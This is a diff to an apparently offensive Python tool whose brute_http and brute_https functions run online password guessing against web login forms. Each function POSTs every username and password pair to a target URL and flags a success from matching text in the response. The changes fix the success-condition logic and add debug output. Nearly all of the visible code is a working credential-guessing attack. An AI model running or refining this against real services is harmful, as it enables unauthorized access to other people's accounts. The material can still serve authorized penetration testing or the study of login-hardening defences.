@@ -164,6 +164,10 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
     if valueData is not None:
         for value in data[2:]:
             datas[value] = valueData.pop(0)
+    datas[data[0]] = 'x'
+    datas[data[1]] = 'x'
+    print("[YOUR DATA EAMPLE] ", datas)
+    print("[YOUR HEADER]", header)
     for user in username:
         passwordFound = False
         for pwd in passwords:
@@ -171,27 +175,25 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
                 datas[data[0]] = user
                 datas[data[1]] = pwd
                 
-                print("[SENDING DATA] ", datas)
                 response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                 if positiveCondition is None:
                     for badCondition in negativeCondition:
-                        #if str(badCondition) not in str(response.text):
-                        if re.search(str(badCondition), str(response.text)):
-                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
+                        if str(badCondition) not in str(response.text):
+                            print("\n[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                             print(f"[HTTP] Success: {user}:{pwd}")
                             passwordFound = True
                             break
                         else:
-                            print(f"[HTTP] Failed - Bad Condition is '{badCondition}': {user}:{pwd}")
+                            print(f"[HTTP] Failed: {user}:{pwd}")
                 else:
                     for posCondition in positiveCondition:
-                        if str(posCondition) not in str(response.text):
-                            print("[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
+                        if str(posCondition) in str(response.text):
+                            print("\n[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                             print(f"[HTTP] Success: {user}:{pwd}")
                             passwordFound = True
                             break
                         else:
-                            print(f"[HTTP] Failed - Good Condition is '{posCondition}': {user}:{pwd}")
+                            print(f"[HTTP] Failed: {user}:{pwd}")
             except requests.exceptions.RequestException as e:
                 print(f"[HTTP] Error: {e}")
                 time.sleep(1)
@@ -203,10 +205,17 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
 def brute_https(url, username, passwords, header, data, valueData, negativeCondition, positiveCondition):
     print("[+] HTTPS BRUTE-FORCE STARTING")
     print("[URL] ", url)
+    print("[URL] ", url)
+    print("[NEGATIVE CONDITION LIST] ", negativeCondition)
+    print("[POSITIVE CONDITION LIST] ", positiveCondition)
     datas = {}
     if valueData is not None:
-        for value in valueData[2:]:
-            datas[value] = valueData
+        for value in data[2:]:
+            datas[value] = valueData.pop(0)
+    datas[data[0]] = 'x'
+    datas[data[1]] = 'x'
+    print("[YOUR DATA EAMPLE] ", datas)
+    print("[YOUR HEADER]", header)
     for user in username:
         passwordFound = False
         for pwd in passwords:
@@ -214,7 +223,6 @@ def brute_https(url, username, passwords, header, data, valueData, negativeCondi
                 datas[data[0]] = user
                 datas[data[1]] = pwd
                 
-                print("[SENDING DATA] ", datas)
                 response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                 if positiveCondition is None:
                     for badCondition in negativeCondition:
